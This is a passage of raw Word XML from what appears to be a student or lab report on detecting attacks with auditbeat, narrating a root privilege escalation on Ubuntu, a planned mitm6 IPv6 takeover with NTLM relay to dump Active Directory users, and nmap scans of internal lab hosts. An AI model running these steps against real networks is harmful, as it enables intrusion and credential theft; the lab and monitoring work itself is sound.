    <w:p w:rsidR="002602ED" w:rsidRDefault="008A32AC" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidR="002602ED" w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">rom the picture above after the attacker run the exploit for privilege escalation and </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidR="002602ED" w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> succeed the attacker got root shell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="002602ED" w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="002602ED" w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>n the picture above we can see the time when the attacker got the root shell with indicators of process bash opened by root few seconds after exploit.cron.sh executed so we also catch privilege escalation on the Ubuntu great.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002602ED" w:rsidRPr="002602ED" w:rsidRDefault="002602ED" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>The next attack that we will try to monitor will be ipv6 take</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>over</w:t>
      </w:r>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which we running from our target Ubuntu after we got the root shell on that machine. For this attack we will use 2 </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>tools :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.mitm6 is a pen testing tool that explo</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> the default configuration of windows to take over the default </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dns</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> server, so in this attack will use ipv6 to spoof the windows users. The second tool for this attack will be nltmrelayx.py which will be the tool that relay the hashes automaticity throw the active directory and by this we will see authentication succeed and then we will dump all the information about all the </w:t>
      </w:r>
      <w:r w:rsidR="00AF45AB" w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>user’s</w:t>
      </w:r>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> domain.  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002602ED" w:rsidRDefault="002602ED" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002602ED">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>First let’s run mitm6 and see what</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> we can see with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>auditbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> logs, before we run ipv6 attack we first need to find our targets after we got root shell, we will run again </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> for network scanning but this time</w:t>
      </w:r>
      <w:r w:rsidR="0020780D">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> from inside our target machine.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008A32AC" w:rsidRDefault="008A32AC" w:rsidP="00944C35">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0020780D" w:rsidRPr="00944C35" w:rsidRDefault="008A32AC" w:rsidP="00944C35">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E110F7">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E110F7">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0020780D" w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Network Scanning (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="0020780D" w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>nside target machine)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0020780D" w:rsidRPr="0020780D" w:rsidRDefault="0020780D" w:rsidP="0020780D">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0020780D" w:rsidRDefault="009872FC" w:rsidP="002602ED">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0DCC78AE" wp14:editId="783E765C">
            <wp:extent cx="4340774" cy="450405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04" cy="4531168"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">On the picture above we see the attacker first run command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ifconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to check what his </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> after he got full access on Ubuntu </w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">machine, then we run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> scanner with the command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.10.0-3.0/16</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> network discovery</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">So after we run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> we find this </w:t>
      </w:r>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>IPs</w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>10.10.0.6</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">10.10.0.8 </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>10.10.1.100</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="008A32AC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Those are</w:t>
      </w:r>
      <w:r w:rsidR="009872FC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> the most interesting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>IPs</w:t>
      </w:r>
      <w:r w:rsidR="009872FC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> here</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009872FC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidR="009872FC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">ow when we got the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">IPs </w:t>
      </w:r>
      <w:r w:rsidR="009872FC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">we can run another </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009872FC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="009872FC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> scan and this time we will run our scan with another argument</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="009872FC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>–</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009872FC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="009872FC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009872FC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>So let’s try that</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4A513661" wp14:editId="28A00C2B">
            <wp:extent cx="5486400" cy="366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66395"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">This time we use the command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –T5 10.10.0.6-8/24</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> default scripts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> enumerate versions </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">-T5 speed scan T5 the fastest T1 slowest </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRDefault="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">I choose </w:t>
      </w:r>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">scan the hosts 10.10.0.6 and 10.10.0.8 because this is the </w:t>
      </w:r>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>available</w:t>
      </w:r>
      <w:r w:rsidR="008A32AC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">hosts that we found on the previews scans so we need enumerate more and understand what </w:t>
      </w:r>
      <w:r w:rsidR="008A32AC" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>the architecture of this network is</w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F2B7ACA" wp14:editId="62126891">
            <wp:extent cx="5486400" cy="4820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4820920"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">So as we see these two computers use windows systems because we see ports like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>rpc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>smb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and we also see name services from the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
